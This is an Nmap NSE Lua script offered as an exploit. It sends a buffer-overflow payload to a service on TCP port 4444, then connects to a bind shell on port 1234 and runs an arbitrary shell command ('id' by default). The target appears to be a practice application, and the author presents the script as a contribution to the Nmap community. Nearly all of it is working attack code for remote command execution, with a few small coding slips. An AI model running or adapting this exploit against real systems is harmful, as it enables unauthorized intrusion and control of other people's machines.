local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"

description = [[
Attempts to perform a buffer overflow on the target system running the WAITUCK vuln application.
]]

---
-- @usage
-- nmap --script waituck-vuln -p 4444 <host>
--
-- @output
-- PORT     STATE SERVICE REASON
-- 4444/tcp open  krb524  syn-ack
-- | waituck-vuln:
-- |   VULNERABLE:
-- |   WAITUCK vuln
-- |     State: VULNERABLE (Exploitable)
-- |     Description:
-- |       This is my attempt to become accepted as part of the nmap community :)
-- |     Disclosure date: 2017-03-26
-- |     Exploit results:
-- |       Shell command: id
-- |_      Results: uid=1000(whitehats) gid=1000(whitehats) groups=1000(whitehats),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

--
-- @args waituck.cmd  Command to execute in shell
--       (default is <code>id</code>).
--
-- Version 0.1
-- Created 26/03/2017 - v0.1 - created by Wong Wai Tuck
---

author = "Wong Wai Tuck <waituck@edgis-security.org>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive", "vuln"}

local PAYLOAD_LOCATION = "nselib/data/evil-waituck"
local WAITUCK_TCP_PORT = 4444
local CMD_SHELL_ID = "id"

portrule = shortport.portnumber(WAITUCK_TCP_PORT, "tcp", "open")

local function load_payload()
  local payload_l = nmap.fetchfile(PAYLOAD_LOCATION)
  if (not(payload_l)) then
    stdnse.print_debug(1, "%s:Couldn't load payload %s", SCRIPT_NAME, PAYLOAD_LOCATION)
    return
  end

  local payload_h = io.open(payload_l, "rb")
  local payload = payload_h:read("*a")
  if (not(payload)) then
    stdnse.print_debug(1," %s:Couldn't load payload %s", SCRIPT_NAME, payload_l)
    if namp.verbosity()>=2 then
      return "[Error] Couldn't load payload"
    end
    return
  end

  payload_h:flush()
  payload_h:close()
  return payload
end

-- send_payload(ip, timeout)
-- Sends the payload to port
---
local function send_payload(ip, timeout, payload)
  local data
  stdnse.print_debug(2, "%s:Sending payload", SCRIPT_NAME)
  local socket = nmap.new_socket("tcp")
  socket:set_timeout(tonumber(timeout))
  local status = socket:connect(ip, WAITUCK_TCP_PORT, "tcp")
  if (not(status)) then return end
  status = socket:send(payload)
  if (not(status)) then
    socket:close()
    return
  end
  status, data = socket:receive()
  if (not(status)) then
    socket:close()
    return
  end
  socket:close()

  return data
end


-- Closes the backdoor connection if it exists.
local function finish_check(socket, status, message)
  if socket then
    socket:close()
  end
  return status, message
end


-- Check backdoor launched
--- Returns true, if the backdoor was launched
local function check_backdoor(host, shell_cmd, vuln, timeout)
  local socket = nmap.new_socket("tcp")
  socket:set_timeout(tonumber(timeout))

  local status, ret = socket:connect(host, 1234, "tcp")
  if not status then
    return finish_check(socket, false, "can't connect to tcp port 1234")
  end

  status, ret = socket:send(CMD_SHELL_ID.."\n")
  if not status then
    return finish_check(socket, false, "failed to send shell command")
  end

  status, ret = socket:receive_lines(1)
  if not status then
    return finish_check(socket, false,
      string.format("failed to read shell command results: %s",
      ret))
  end

  if not ret:match("uid=") then
    return finish_check(socket, false, "service on port 1234 is not our bind shell backdoor, service may not be vulnerable")
  end

  vuln.state = vulns.STATE.EXPLOIT
  table.insert(vuln.exploit_results,
    string.format("Shell command: %s", CMD_SHELL_ID))
  local result = string.gsub(ret, "^%s*(.-)\n*$", "%1")
  table.insert(vuln.exploit_results,
    string.format("Results: %s", result))

  if shell_cmd ~= CMD_SHELL_ID then
    status, ret = socket.send(shell_cmd.."\n")
    if status then
      status, ret = socket:receive_lines(1)
      if status then
        table.insert(vuln.exploit_results,
          string.format("Shell command: %s", shell_cmd))
        result = string.gsub(ret, "^%s*(.-)\n*$", "%1")
        table.insert(vuln.exploit_results,
          string.format("Results: %s", result))
      end
    end
  end

  socket:send("exit\n");

  return finish_check(socket, true)
end


action = function(host, port)
  local timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 1000
  local payload = load_payload()
  local cmd = stdnse.get_script_args("waituck.cmd") or stdnse.get_script_args("exploit.cmd") or CMD_SHELL_ID

  local waituck_vuln = {
    title = "WAITUCK vuln",
    description = [[
This is my attempt to become accepted as part of the nmap community :)]],
    dates = {
      disclosure = {year = '2017', month = '03', day = '26'},
    },
    exploit_results = {},
  }
  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  -- check if exploit has been ran
  local status, ret = check_backdoor(host, cmd, waituck_vuln, timeout)
  if status then
    return report:make_output(waituck_vuln)
  end


  local response = send_payload(host.ip, timeout, payload, timeout)
  stdnse.sleep(1)

  -- check if the backdoor successfully ran
  status, ret = check_backdoor(host, cmd, waituck_vuln, timeout)
  if not status then
    stdnse.debug1("failed to invoke command: %s", ret)
    waituck_vuln.state = vulns.STATE.NOT_VULN
    return report:make_output(waituck_vuln)
  end

  return report:make_output(waituck_vuln)
end
